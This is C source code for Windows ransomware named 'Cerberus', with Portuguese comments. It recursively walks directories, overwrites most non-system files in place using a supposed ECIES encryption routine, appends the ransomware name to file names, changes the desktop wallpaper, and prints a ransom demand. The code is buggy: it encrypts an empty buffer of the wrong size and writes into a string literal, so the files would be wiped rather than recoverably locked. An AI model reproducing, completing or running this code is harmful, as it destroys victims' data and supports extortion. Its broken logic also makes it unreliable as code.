#include <stdlib.h>
#include <stdio.h>
#include <string.h>
#include <Windows.h>
#include "dirent.h"
#include "AE.h"
#define MAX_PATH 1024
#define extension_name "Cerberus"
#include "crip.h"
// voce pode

void  mudar_papel(){
{
	SystemParametersInfoA (SPI_SETDESKWALLPAPER, 0 , (PVOID)"C:\\Users\estan\\OneDrive\\Imagens\\Nova pasta imagem" , SPIF_SENDCHANGE); // SPIA para mudar o papel de parede :D
}
}

void encerrar_processo(char *name){






}
void file_incri(char * filename){
  char *in = NULL,*out = NULL;
	HANDLE file_fd = NULL;
	DWORD file_size = 0,written_bytes,read_bytes,cnt = 0,ThreadID = 0,Orig;

	char ransom_name[MAX_PATH];



	if((file_fd = CreateFile(filename,GENERIC_READ|GENERIC_WRITE,FILE_SHARE_READ|FILE_SHARE_WRITE,NULL,
		OPEN_EXISTING,FILE_ATTRIBUTE_NORMAL,NULL)) == INVALID_HANDLE_VALUE)
	{
		 /* Fail to open */
		return;
	}

	file_size = GetFileSize(file_fd,NULL);

	if(file_size == 0xFFFFFFFF)
	{
		 /* Fail to get size */
		CloseHandle(file_fd);
		return;
	}

	/* filesize % 8 == 0 */
    if(file_size % 8 != 0)
	{
	file_size = ((file_size/8)+1)*8;
	}

	/* Ok, allocate memory */
	in = (char *)GlobalAlloc(GMEM_FIXED|GMEM_ZEROINIT,file_size);
	out = (char *)GlobalAlloc(GMEM_FIXED|GMEM_ZEROINIT,file_size);

	if(in == NULL || out == NULL)
	{
		 /* Fail to allocate memory */
		CloseHandle(file_fd);
		return;
	}

#define FREE_ALL GlobalFree(in); \
	             GlobalFree(out); \
	             CloseHandle(file_fd);

	/* Read entire file in buf */
	if(ReadFile(file_fd,in,file_size,&read_bytes,NULL) == 0)
	{
		/* Fail to read */
		FREE_ALL
		return;
	}

	/* Write encrypted version */
	SetFilePointer(file_fd,0,0,FILE_BEGIN);

	 /* Encrypt ! */
	 ECIES_encryption(out,out,sizeof out,"32900","35000");

	if(WriteFile(file_fd,out,file_size,&written_bytes,NULL) == 0)
	{
		/* Fail to write */
		FREE_ALL
		return;
	}

	/* Free */
	FREE_ALL


	strcpy(extension_name,filename);
	strcat(filename,extension_name);
	MoveFile(filename,extension_name);






}


void S3arch(char *pt) {
	 char sc[MAX_PATH],buf[MAX_PATH];
	 WIN32_FIND_DATA in;
	 HANDLE fd,file;
	 char *fm = "%s\\%s",*fm1 = "%s\\*.*";

	 if(strlen(pt) == 3)
	 {
		pt[2] = '\0'; /* :-) */
	 }

	 sprintf(sc,fm1,pt);
     fd = FindFirstFile(sc,&in);

 do
 {

	 sprintf(buf,fm,pt,in.cFileName);

	   /* dot :) */
	 if(strcmp(in.cFileName,"..") != 0 && strcmp(in.cFileName,".") != 0 && (in.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY))
	 {
		 S3arch(buf);
	 }

	   /* File found */
	 else
	 {

		 /* is it good to encrypt ? */

		 if( !strstr(in.cFileName,".dll")
			 && !strstr(in.cFileName,".exe") && !strstr(in.cFileName,".ini") &&
			     !strstr(in.cFileName,".vxd") && !strstr(in.cFileName,".drv") &&
				 strcmp(in.cFileName,"..") != 0 && strcmp(in.cFileName,".") != 0)
		 {
			 file_incri(buf);
		 }
	 }

 }while(FindNextFile(fd,&in));

 FindClose(fd);
}

int main(){



//S3arch("C:\\");
//mudar_papel();
printf(" Seu computador foi infectado com ransoware pague o resgate para ter seus arquivos de volta");
S3arch("C:\\Users\\estan\\OneDrive\\Imagens\\Nova pasta imagem");
}
